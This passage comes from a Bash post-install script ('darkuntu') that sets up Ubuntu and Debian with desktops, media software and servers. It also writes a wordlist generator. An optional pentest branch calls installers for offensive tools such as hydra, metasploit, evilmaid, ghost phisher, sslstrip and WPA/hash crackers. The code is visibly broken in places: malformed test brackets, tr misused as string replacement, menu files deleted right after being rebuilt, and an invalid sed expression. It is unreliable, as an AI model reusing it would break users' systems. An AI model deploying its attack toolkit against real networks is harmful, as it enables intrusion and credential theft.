4) Create a WordList from your MP3 files TAG

=======================================================

£+
echo -en £+ Select a operation from the menu: £+

read choice

case harrypotterchoice in

1) f_pdf_to_text ;;

2) f_catdoc ;;

3) f_html_to_text ;;

4) f_id3v2 ;;

*) echo £+harrypotterchoice is not valid £+; sleep 3 ;;

esac

}


f_menu


" | sed -e 's/harrypotter/$/g' | sed -e 's/£+/"/g' >> wordlistgen.sh

}

f_writing_wordlist_gen

ln -sf /opt/darkeffe/wordlistgen.sh /usr/local/bin/wordlistgen 1> /dev/null

cd $HOME

}

f_wordlist_gen

mv /darkuntu.sh /opt/darkeffe/darkuntu.sh 1> /dev/null
ln -sf /opt/darkeffe/darkuntu.sh /usr/local/bin/darkuntu 1> /dev/null

cd $HOME

}

# CopyScripts
f_copyscripts () {

cd $home
mkdir -p Scripts
echo "$home/Scripts" >> $file
cd Scripts

mkdir -p Octave
echo "$home/Scripts/Octave" >> $file
cd Octave
mkdir -p 3
echo "$home/Scripts/Octave/3" >> $file
cp /usr/share/3.2.4/m/school/3/*.m $home/Scripts/Octave/3
mkdir -p 4
echo "$home/Scripts/Octave/4" >> $file
cp /usr/share/3.2.4/m/school/4/*.m $home/Scripts/Octave/4
mkdir -p 5
echo "$home/Scripts/Octave/5" >> $file
cp /usr/share/3.2.4/m/school/5/*.m $home/Scripts/Octave/5

cd ..

mkdir -p darkeffe
echo "$home/Scripts/darkeffe" >> $file
cp /opt/darkeffe/*.sh $home/Scripts/darkeffe/

mkdir -p C
echo "$home/Scripts/C" >> $file

cd $home

}

#==============================================================================================================================#

# Buntu
f_buntu () {

	clear

	f_truecrypt

	clear

	f_java_buntu

	clear

	f_axel_buntu_debian

	f_repo_buntu
	if [ $composite == $nocomposite ]; then
		mv /etc/apt/sources.list /etc/apt/sources.list2
		cat /etc/apt/sources.list2 | sed -e 's/# Repository AWN//' -e 's/deb http://ppa.launchpad.net/awn-testing/ppa/ubuntu natty main//' >> /etc/apt/sources.list
		rm -f /etc/apt/sources.list2
	fi

	f_dir

	f_programming_libraries_buntu_debian

	f_compressor_buntu_debian

	f_firmware_buntu

	if [ $composite == $nvidia ]; then
		f_nvidia_buntu_debian
		clear
	fi
	if [ $composite == $ati ]; then
		f_ati
		clear
	fi

	if [ $gui != $nogui ]; then
		if [ $gui == $gnome ]; then
			f_gnome_buntu
		elif [ $gui == $kde ]; then
			f_kde_buntu_debian
		elif [ $gui == $xfce ]; then
			f_xfce_buntu_debian
		elif [ $gui == $lxde ]; then
			f_lxde_buntu_debian
		elif [ $gui == $enlight ]; then
			f_enlight
		else
			f_openbox_standalone_buntu_debian
			if [ $composite == $nvidia ]; then
				mv $HOME/.config/openbox/menu.xml $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | tr '/opt/darkeffe/update.sh' '/opt/darkeffe/update-nvidia.sh' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu2.xml
				cd $HOME
			elif [ $composite == $ati ]; then
				mv $HOME/.config/openbox/menu.xml menu2.xml
				cat $HOME/.config/openbox/menu2.xml | tr '/opt/darkeffe/update.sh' '/opt/darkeffe/update-ati.sh' | sed -e '/Nvidia/d' | sed -e '/crark [percorso file rar]/d' | sed -e '/crark-hp [percorso file rar]/d' | sed -e '/Cuda-Multiforcer/d' >> $HOME/.config/openbox/menu.xml
				rm -f $HOME/.config/openbox/menu2.xml
				cd $HOME
			else
				cd $HOME/.config/openbox
				mv $HOME/.config/openbox/menu.xml $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e '/avant-window-navigator/d' | sed -e '/Nvidia/d' | sed -e '/crark [percorso file rar]/d' | sed -e '/crark-hp [percorso file rar]/d' | sed -e '/Cuda-Multiforcer/d' >> menu.xml
				rm -f $HOME/.config/openbox/menu2.xml
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e '/cairo-comprmg/d' | sed -e '/avant-window-navigator/d' >> $HOME/.config/openbox/autostart.sh
				rm $HOME/.config/openbox/autostart2
				cd  $HOME
				mv $HOME/.config/tint2/tint2rc $HOME/.config/tint2/tint2rc2
				cat $HOME/.config/tint2/tint2rc2 | sed -e 's/panel_position = bottom center horizontal/panel_position = top center horizontal/g' | sed -e 's/panel_size = 95% 36/pannel_size = 50% 30/g' >> $HOME/.config/tint2/tint2rc
				rm $HOME/.config/tint2/tint2rc2
				cd $HOME
			fi
			if [ $audiopl != $audacious ]; then
				mv $HOME/.config/openbox/menu.xml $HOME/.config/openbox/menu2.xml
				cat menu2.xml | sed -e '/audacious.py/d' >> $HOME/.config/openbox/menu.xml
 				rm -f $HOME/.config/openbox/menu2.xml
				rm -f $HOME/.config/openbox/scripts/audacious.py
			fi
			if [ $firewall == $activeserver ]; then
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e 's/firewallclient.sh/firewallserver.sh/g' >> $HOME/.config/openbox/autostart.sh
				rm -f $HOME/.config/openbox/autostart2
			fi
			if [ $firewall == $disactive ]; then
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e 's/firewallclient.sh/d' >> $HOME/.config/openbox/autostart.sh
				rm -f $HOME/.config/openbox/autostart2
			fi
			if [ $composite == $nocomposite ]; then
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e '/cairo-comprmg/d' | sed -e '/avant-window-navigator/d' >> $HOME/.config/openbox/autostart.sh
				rm -f $HOME/.config/openbox/autostart2
			fi
			if [ $music != $jack ]; then
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e '/qjacktl/d' >> $HOME/.config/openbox/autostart.sh
				rm -f $HOME/.config/openbox/autostart2
			fi
		fi
	fi

	if [ $composite != $nocomposite ]; then
		if [ $gui != $nogui ] || [ $gui != $openboxstand ]; then
			if [ $compiz = 'yes' ] || [ $compiz = 'YES' ]; then
				f_compiz_buntu_debian
			fi
		fi
	fi

	if [ $gui == $nogui ]; then
		f_wicd_nogui_buntu_debian
	fi
	if [ $gui != $nogui ]; then
		f_wicd_buntu_debian
		if [ $gui == $kde ]; then
			f_blue_kde_buntu_debian
		else
			f_blue_buntu_debian
		fi
		f_gigolo_buntu_debian
		f_pyne_buntu_debian
	fi

	if [ $gui != $nogui ]; then
		f_office_buntu_debian
		if [ $gui == $kde ]; then
			apt-get install -y --force-yes -y --force-yes libreoffice-kde 1> /dev/null 2> $LOG
		fi
	fi

	if [ $gui != $nogui ]; then
		f_codec_buntu
	fi

	f_octave_buntu_debian

	f_command_accessories_buntu_debian

	if [ $gui != $nogui ]; then
		if [ $gui == $kde ]; then
			f_accessories_kde_buntu_debian
		else
			f_accessories_buntu_debian
		fi
		if [ $gui == $openboxstand ]; then
			f_volumeico
		fi
	fi

	if [ $gui != $nogui ]; then
		if [ $gui == $gnome ]; then
			f_fileroller_buntu_debian
		elif [ $gui == $kde ]; then
			f_ark_buntu_debian
		else
			f_xarchiver_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		if [ $gui == $kde ]; then
			f_kphotoalbum_buntu_debian
		else
			f_mirage_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		f_gimp_buntu_debian
	fi

	if [ $gui != $nogui ]; then
		f_deejayd_buntu_debian
		f_mplayer_buntu_debian
		f_handbrake_buntu_debian
		f_winff_ffmpeg_buntu_debian
		if [ $music == $alsa ]; then
			f_alsa_buntu_debian
			mv /etc/deejayd.conf /etc/deejayd2.conf
			cat /etc/deejayd2.conf | sed -e 's/audio_output = auto/audio_output = alsa/' >> /etc/deejayd.conf
			rm -f /etc/deejayd2.conf
		fi
		if [ $music == $pulse ]; then
			f_pulse_buntu_debian
			mv $HOME/.mplayer/config $HOME/.mplayer/config2
			cat $HOME/.mplayer/config2 | sed -e 's/ao=alsa/ao=pulse/' >> $HOME/.mplayer/config
			rm -f $HOME/.mplayer/config2
			mv /etc/deejayd.conf /etc/deejayd2.conf
			cat /etc/deejayd2.conf | sed -e 's/audio_output = auto/audio_output = pulse/' >> /etc/deejayd.conf
			rm -f /etc/deejayd2.conf
		fi
		if [ $music == $jackal ]; then
			f_alsa_buntu_debian
			f_jack_buntu_debian
			mv $HOME/.mplayer/config $HOME/.mplayer/config2
			cat $HOME/.mplayer/config2 | sed -e 's/ao=alsa/ao=jack/' >> $HOME/.mplayer/config
			rm -f $HOME/.mplayer/config2
			mv /etc/deejayd.conf /etc/deejayd2.conf
			cat /etc/deejayd2.conf | sed -e 's/audio_output = auto/audio_output = jack/' >> /etc/deejayd.conf
			rm -f /etc/deejayd2.conf
		fi
		if [ $music == $jackpu ]; then
			f_pulse_buntu_debian
			apt-get install -y --force-yes pulseaudio-module-jack 1> /dev/null 2> $LOG
			f_jack_buntu_debian
			mv $HOME/.mplayer/config $HOME/.mplayer/config2
			cat $HOME/.mplayer/config2 | sed -e 's/ao=alsa/ao=jack/' >> $HOME/.mplayer/config
			rm -f $HOME/.mplayer/config2
			mv /etc/deejayd.conf /etc/deejayd2.conf
			cat /etc/deejayd2.conf | sed -e 's/audio_output = auto/audio_output = jack/' >> /etc/deejayd.conf
			rm -f /etc/deejayd2.conf
		fi
	fi

	if [ $gui != $nogui ]; then
		if [ $audioplcho == $amarok ]; then
			f_amarok_buntu_debian
		fi
		if [ $audioplcho == $audacious ]; then
			f_audacious_buntu_debian
		fi
		if [ $audioplcho == $clementine ]; then
			f_clementine_buntu_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/audacious/clementine/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $audioplcho == $exaile ]; then
			f_exaile_buntu_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/audacious/exaile/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $audioplcho == $rhythmbox ]; then
			f_rhythmbox_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		if [ $gui == $gnome ]; then
			f_brasero_buntu_debian
		elif [ $gui == $kde ]; then
			f_k3b_buntu_debian
		else
			f_xfburn_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		f_multimedia_software_buntu_debian
	fi

	if [ $gui != $nogui ]; then
		if [ $music == $jackal ] || [ $music == $jackpu ]; then
			f_dj_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		f_internet_software_buntu_debian
	fi

	f_lynx_buntu_debian

	if [ $gui != $nogui ]; then
		if [ $webchoice == $midori ]; then
			f_midori_buntu
		fi
		if [ $webchoice == $firefox ]; then
			f_firefox_buntu
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/midori -p/firefox-trunk -private/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $webchoice == $icecat ]; then
			f_icecat_buntu_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/midori -p/icecat/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $webchoice == $chromium ]; then
			f_chromium_buntu
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/midori -p/chromium-browser --incognito/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $webchoice == $opera ]; then
			f_opera_buntu
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/midori -p/opera/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
	fi

	f_it_buntu_debian
	if [ $webchoice == $firefox ]; then
		apt-get install -y --force-yes firefox-trunk-locale-it 1> /dev/null 2> $LOG
	fi
	if [ $webchoice == $icecat ]; then
		apt-get install -y --force-yes icecat-it 1> /dev/null 2> $LOG
	fi

	if [ $proxycho == $proxyactive ]; then
		f_proxy_buntu_debian
	fi
	if [ $servercho == $serverfull ]; then
		f_apache_buntu_debian
		if [ $gui != $nogui ]; then
			if [ $pentestcho == $pentest ]; then
				f_xplico_buntu_debian
			fi
		fi
		f_php5_buntu_debian
		f_sqlite3_buntu_debian
		f_mysql_buntu_debian
		f_samba_buntu_debian
		f_ssh_server_buntu_debian
		f_ftp_server_buntu_debian
		f_telnet_server_buntu_debian
		f_cups_buntu_debian
		f_vnc_buntu_debian
	fi
	if [ $servercho == $serverlittle ]; then
		f_sqlite3_buntu_debian
		if [ $pentestcho == $pentestactive ]; then
			f_mysql_buntu_debian
		fi
		f_samba_buntu_debian
		f_ftp_client_buntu_debian
		f_ssh_client_buntu_debian
		f_telnet_client_buntu_debian
	fi

	if [ $gui != $nogui ]; then
		if [ $composite == $nvidia ] || [ $composite == $ati ]; then
			f_awn_buntu_debian
			cd $HOME
			mkdir -p .config
			cd .config
			mkdir -p awn
			cd awn
			mkdir launchers
			cd $HOME
			if [ $gui == $openboxstand ]; then
				cp /usr/share/applications/tint2menu.desktop $HOME/.config/awn/launchers/tint2menu.desktop
			fi
			if [ $webchoice == $midori ]; then
				cp /usr/share/applications/midori.desktop $HOME/.config/awn/launchers/midori.desktop
			fi
			if [ $webchoice == $firefox ]; then
				cp /usr/share/applications/firefox-trunk.desktop $HOME/.config/awn/launchers/firefox-trunk2.desktop
				cat $HOME/.config/awn/launchers/firefox-trunk2.desktop | sed -e 's|Exec=firefox-trunk %u|Exec=firefox-trunk --private-toggle %u|' >> $HOME/.config/awn/launchers/firefox-trunk.desktop
				rm -f $HOME/.config/awn/launchers/firefox-trunk2.desktop
			fi
			if [ $webchoice == $icecat ]; then
				cp /usr/share/applications/icecat.desktop $HOME/.config/awn/launchers/icecat.desktop 1> /dev/null
			fi
			if [ $webchoice == $chromium ]; then
				cp /usr/share/applications/chromium-browser.desktop $HOME/.config/awn/launchers/chromium-browser2.desktop
				cat $HOME/.config/awn/launchers/chromium-browser2.desktop | sed -e 's|Exec=\/usr\/bin\/chromium-browser %U|Exec=\/usr\/bin\/chromium-browser --incognito|' >> $HOME/.config/awn/launchers/chromium-browser.desktop
				rm -f $HOME/.config/awn/launchers/chromium-browser2.desktop
			fi
			if [ $webchoice == $opera ]; then
				cp /usr/share/applications/opera.desktop $HOME/.config/awn/launchers/opera.desktop
			fi
			if [ $gui == $gnome ]; then
				cp /usr/share/applications/nautilus-browser.desktop $HOME/.config/awn/launchers/nautilus-browser.desktop
			fi
			if [ $gui == $kde ]; then
				cp /usr/share/applications/Thunar.desktop $HOME/.config/awn/launchers/thunar.desktop
			elif [ $gui == $gnome[; then
				cp /usr/share/applications/nautilus-browser.desktop $HOME/.config/awn/launchers/nautilus-browser.desktop
			else
				cp /usr/share/applications/Thunar.desktop $HOME/.config/awn/launchers/thunar.desktop
			fi
			cp /usr/share/applications/roxterm.desktop $HOME/.config/awn/launchers/roxterm.desktop
			cp /usr/share/applications/gnome-mplayer.desktop $HOME/.config/awn/launchers/gnome-mplayer.desktop
			cp /usr/share/applications/amsn.desktop $HOME/.config/awn/launchers/amsn.desktop
			cp /usr/share/applications/amule.desktop $HOME/.config/awn/launchers/amule.desktop
			cp /usr/share/applications/frostwire.desktop $HOME/.config/awn/launchers/frostwire.desktop
			cp /usr/share/applications/geany.desktop $HOME/.config/awn/launchers/geany.desktop
		fi
	fi

	if [ $pentestcho == $pentestactive ]; then
		clear
		if [ $composite == $nvidia ]; then
			f_aircrack_ng_cuda
		fi
		if [ $composite == $ati ] || [ $composite == $nocomposite ]; then
			f_aircrack_ng
		fi
		f_airoscript
		f_bluediving
		f_brutessh
		f_catdoc
		f_cewl_buntu_debian
		f_chntpw
		f_cowpatty
		if [ $composite == $nvidia ]; then
			f_crark
		fi
		f_creepy
		f_crunch
		if [ $composite == $nvidia ]; then
			f_cudamultiforcer
		fi
		f_database
		f_dcrack
		f_driftnet_buntu_debian
		f_dsniff_buntu_debian
		if [ $gui == $nogui ]; then
			f_ettercap_buntu_command
		fi
		if [ $gui != $nogui ]; then
			f_ettercap_buntu_gui
		fi
		f_evilmaid
		f_exiftool
		f_exploit_db
		if [ $gui == $nogui ]; then
			f_fern_wifi_cracker
		fi
		f_geoedge
		if [ $gui == $nogui ]; then
			f_ghost_pisher
		fi
		f_ham_ferr
		f_harvester
		f_hashcat_cpu
		if [ $gui != $nogui ]; then
			f_hashcat_cpu_gui
		fi
		if [ $composite == $nvidia ] || [ $composite == $ati ]; then
			f_hashcat_ocl_lite
			f_hashcat_ocl_plus
		fi
		if [ $gui != $nogui ]; then
			f_hexor_base
		fi
		f_html2text
		f_hydra
		f_id3V2
		if [ $gui != $nogui ]; then
			f_inguma
		fi
		if [ $composite == $nvidia ] || [ $composite == $ati ]; then
			f_john_opencl
		fi
		if [ $composite == $nocomposite ]; then
			f_john
		fi
		f_leetify
		if [ $gui == $nogui [; then
			f_macchanger_command
		fi
		if [ $gui != $nogui [; then
			f_macchanger_gui_buntu_debian
		fi
		if [ $gui != $nogui ]; then
			f_mantra
		fi
		f_mask_processor
		if [ $gui != $nogui ]; then
			f_mediainfo_buntu_debian
		fi
		f_medusa_buntu_debian
		f_metasploit_buntu_debian
		f_netcat_buntu_debian
		f_netdiscover
		f_nitko
		f_nmap
		if [ $gui != $nogui ]; then
			f_openvas_buntu_debian
		fi
		f_p0f
		f_pdfcrack
		f_pdftotext
		if [ $gui != $nogui ]; then
			f_pyloris
		fi
		if [ $composite == $nvidia ]; then
			f_pyrit_cuda
		fi
		if [ $composite == $ati ]; then
			f_pyrit_callpp
		fi
		if [ $composite == $nocomposite ]; then
			f_pyrit
		fi
		f_rarcrack
		f_reaver_wps
		if [ $gui != $nogui ]; then
			f_set
		fi
		f_sslstrip
		f_uniofuzz
		f_w3af
		f_wifite
		if [ $gui != $nogui ]; then
			f_wireshark_buntu_debian
		fi
		f_wyd
		f_windows_binaries
	fi

	f_darkeffe

	f_copyscripts

	clear

	f_clean

	clear

}

# Debian
f_debian () {

	clear

	f_truecrypt

	clear

	f_java_debian

	clear

	f_axel_buntu_debian

	f_repo_debian

	f_dir

	f_programming_libraries_buntu_debian

	f_compressor_buntu_debian

	f_firmware_debian

	if [ $composite == $nvidia ]; then
		f_nvidia_buntu_debian
		clear
	fi
	if [ $composite == $ati ]; then
		f_ati
		clear
	fi

	if [ $gui != $nogui ]; then
		if [ $gui == $gnome ]; then
			f_gnome_debian
		fi
		if [ $gui == $kde ]; then
			f_kde_buntu_debian
		fi
		if [ $gui == $xfce ]; then
			f_xfce_buntu_debian
		fi
		if [ $gui == $lxde ]; then
			f_lxde_buntu_debian
		fi
		if [ $gui == $enlight ]; then
			f_enlight
		fi
		if [ $gui == $openboxstand ]; then
			f_openbox_standalone
			if [ $composite == $nvidia ]; then
				mv $HOME/.config/openbox/menu.xml $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | tr '/opt/darkeffe/update.sh' '/opt/darkeffe/update-nvidia.sh' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu2.xml
				cd $HOME
			fi
			if [ $composite == $ati ]; then
				mv $HOME/.config/openbox/menu.xml menu2.xml
				cat $HOME/.config/openbox/menu2.xml | tr '/opt/darkeffe/update.sh' '/opt/darkeffe/update-ati.sh' | sed '/Nvidia/d' | sed '/crark [percorso file rar]/d' | sed '/crark-hp [percorso file rar]/d' | sed '/Cuda-Multiforcer/d' >> $HOME/.config/openbox/menu.xml
				rm -f $HOME/.config/openbox/menu2.xml
				cd $HOME
			fi
			if [ $composite == $nocomposite ]; then
				cd $HOME/.config/openbox
				mv $HOME/.config/openbox/menu.xml $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed '/avant-window-navigator/d' | sed '/Nvidia/d' | sed '/crark [percorso file rar]/d' | sed '/crark-hp [percorso file rar]/d' | sed '/Cuda-Multiforcer/d' >> menu.xml
				rm -f $HOME/.config/openbox/menu2.xml
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed '/cairo-comprmg/d' >> $HOME/.config/openbox/autostart.sh
				rm $HOME/.config/openbox/autostart2
				cd
				mv $HOME/.config/tint2/tint2rc $HOME/.config/tint2/tint2rc2
				cat $HOME/.config/tint2/tint2rc2 | sed 's/panel_position = bottom center horizontal/panel_position = top center horizontal/g' | sed -e 's/panel_size = 95% 36/pannel_size = 50% 30/g' >> $HOME/.config/tint2/tint2rc
				rm $HOME/.config/tint2/tint2rc2
				cd $HOME
			fi
			if [ $audiopl != $audacious ]; then
				mv $HOME/.config/openbox/menu.xml $HOME/.config/openbox/menu2.xml
				cat menu2.xml | sed '/audacious.py/d' >> $HOME/.config/openbox/menu.xml
				rm -f $HOME/.config/openbox/menu2.xml
				rm -f $HOME/.config/openbox/scripts/audacious.py
			fi
			if [ $firewall == $activeserver ]; then
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e 's/firewallclient.sh/firewallserver.sh/g' >> $HOME/.config/openbox/autostart.sh
				rm -f $HOME/.config/openbox/autostart2
			fi
			if [ $firewall == $disactive ]; then
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e '/firewallclient.sh/d' >> $HOME/.config/openbox/autostart.sh
				rm -f $HOME/.config/openbox/autostart2
			fi
			if [ $composite == $nocomposite ]; then
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e '/cairo-comprmg/d' | sed -e '/avant-window-navigator/d' >> $HOME/.config/openbox/autostart.sh
				rm -f $HOME/.config/openbox/autostart2
			fi
			if [ $music != $jack ]; then
				mv $HOME/.config/openbox/autostart.sh $HOME/.config/openbox/autostart2
				cat $HOME/.config/openbox/autostart2 | sed -e '/qjacktl/d' >> $HOME/.config/openbox/autostart.sh
				rm -f $HOME/.config/openbox/autostart2
			fi
		fi
	fi

	if [ $composite != $nocomposite ]; then
		if [ $gui != $nogui ] || [ $gui != $openboxstand ]; then
			if [ $compiz = 'yes' ] || [ $compiz = 'YES' ]; then
				f_compiz_buntu_debian
			fi
		fi
	fi

	if [ $gui == $nogui ]; then
		f_wicd_nogui_buntu_debian
	fi
	if [ $gui != $nogui ]; then
		f_wicd_buntu_debian
		if [ $gui == $kde ]; then
			f_blue_kde_buntu_debian
		fi
		if [ $gui != $kde [; then
			f_blue_buntu_debian
		fi
		f_gigolo_buntu_debian
		f_pyne_buntu_debian
	fi

	if [ $gui != $nogui ]; then
		f_office_buntu_debian
		if [ $gui == $kde ]; then
			apt-get install -y --force-yes -y --force-yes libreoffice-kde 1> /dev/null 2> $LOG
		fi
	fi

	if [ $gui != $nogui ]; then
		f_codec_debian
	fi

	f_octave_buntu_debian

	f_command_accessories_buntu_debian

	if [ $gui != $nogui ]; then
		if [ $gui != $kde ]; then
			f_accessories_buntu_debian
		fi
		if [ $gui == $kde ]; then
			f_accessories_kde_buntu_debian
		fi
		if [ $gui == $openboxstand ]; then
			f_volumeico
		fi
	fi

	if [ $gui != $nogui ]; then
		if [ $gui == $gnome ]; then
			f_fileroller_buntu_debian
		fi
		if [ $gui == $kde ]; then
			f_ark_buntu_debian
		fi
		if [ $gui != $gnome ] && [ $gui != $kde ]; then
			f_xarchiver_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		if [ $gui == $kde ]; then
			f_kphotoalbum_buntu_debian
		fi
		if [ $gui != $kde ]; then
			f_mirage_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		f_gimp_buntu_debian
	fi

	if [ $gui != $nogui ]; then
		f_deejayd_buntu_debian
		f_mplayer_buntu_debian
		( f_handbrake_buntu_debian ) &
		sleep 150
		f_winff_ffmpeg_buntu_debian
		if [ $music == $alsa ]; then
			f_alsa_buntu_debian
			mv /etc/deejayd.conf /etc/deejayd2.conf
			cat /etc/deejayd2.conf | sed -e 's/audio_output = auto/audio_output = alsa/' >> /etc/deejayd.conf
			rm -f /etc/deejayd2.conf
		fi
		if [ $music == $pulse ]; then
			f_pulse_buntu_debian
			mv $HOME/.mplayer/config $HOME/.mplayer/config2
			cat $HOME/.mplayer/config2 | sed -e 's/ao=alsa/ao=pulse/' >> $HOME/.mplayer/config
			rm -f $HOME/.mplayer/config2
			mv /etc/deejayd.conf /etc/deejayd2.conf
			cat /etc/deejayd2.conf | sed -e 's/audio_output = auto/audio_output = pulse/' >> /etc/deejayd.conf
			rm -f /etc/deejayd2.conf
		fi
		if [ $music == $jackal ]; then
			f_alsa_buntu_debian
			f_jack_buntu_debian
			mv $HOME/.mplayer/config $HOME/.mplayer/config2
			cat $HOME/.mplayer/config2 | sed -e 's/ao=alsa/ao=jack/' >> $HOME/.mplayer/config
			rm -f $HOME/.mplayer/config2
			mv /etc/deejayd.conf /etc/deejayd2.conf
			cat /etc/deejayd2.conf | sed -e 's/audio_output = auto/audio_output = jack/' >> /etc/deejayd.conf
			rm -f /etc/deejayd2.conf
		fi
		if [ $music == $jackpu ]; then
			f_pulse_buntu_debian
			apt-get install -y --force-yes pulseaudio-module-jack 1> /dev/null 2> $LOG
			f_jack_buntu_debian
			mv $HOME/.mplayer/config $HOME/.mplayer/config2
			cat $HOME/.mplayer/config2 | sed -e 's/ao=alsa/ao=jack/' >> $HOME/.mplayer/config
			rm -f $HOME/.mplayer/config2
			mv /etc/deejayd.conf /etc/deejayd2.conf
			cat /etc/deejayd2.conf | sed -e 's/audio_output = auto/audio_output = jack/' >> /etc/deejayd.conf
			rm -f /etc/deejayd2.conf
		fi
	fi
	if [ $gui != $nogui ]; then
		if [ $audioplcho == $amarok ]; then
			f_amarok_buntu_debian
		fi
		if [ $audioplcho == $audacious ]; then
			f_audacious_buntu_debian
		fi
		if [ $audioplcho == $clementine ]; then
			f_clementine_buntu_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/audacious/clementine/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $audioplcho == $exaile ]; then
			f_exaile_buntu_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/audacious/exaile/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $audioplcho == $rhythmbox ]; then
			f_rhythmbox_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		if [ $gui == $gnome ]; then
			f_brasero_buntu_debian
		elif [ $gui == $kde ]; then
			f_k3b_buntu_debian
		else
			f_xfburn_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		f_multimedia_software_buntu_debian
	fi

	if [ $gui != $nogui ]; then
		if [ $music == $jackal ] || [ $music == $jackpu ]; then
			f_dj_buntu_debian
		fi
	fi

	if [ $gui != $nogui ]; then
		f_internet_software_buntu_debian
	fi

	f_lynx_buntu_debian

	if [ $gui != $nogui ]; then
		if [ $webchoice == $midori ]; then
			f_midori_debian
		fi
		if [ $webchoice == $firefox ]; then
			f_iceweasel_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/midori -p/iceweasel/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $webchoice == $icecat ]; then
			f_icecat_buntu_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/midori -p/icecat/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $webchoice == $chromium ]; then
			f_chromium_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/midori -p/chromium-browser --incognito/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
		if [ $webchoice == $opera ]; then
			f_opera_debian
			if [ $gui == $openboxstand ]; then
				mv $HOME/.config/openbox/menu.xml  $HOME/.config/openbox/menu2.xml
				cat $HOME/.config/openbox/menu2.xml | sed -e 's/midori -p/opera/g' >> $HOME/.config/openbox/menu.xml
				rm $HOME/.config/openbox/menu.xml
			fi
		fi
	fi

	f_it_buntu_debian
	if [ $webchoice == $firefox ]; then
		apt-get install -y --force-yes iceweasel-l10n-it 1> /dev/null 2> $LOG
	fi
	if [ $webchoice == $icecat ]; then
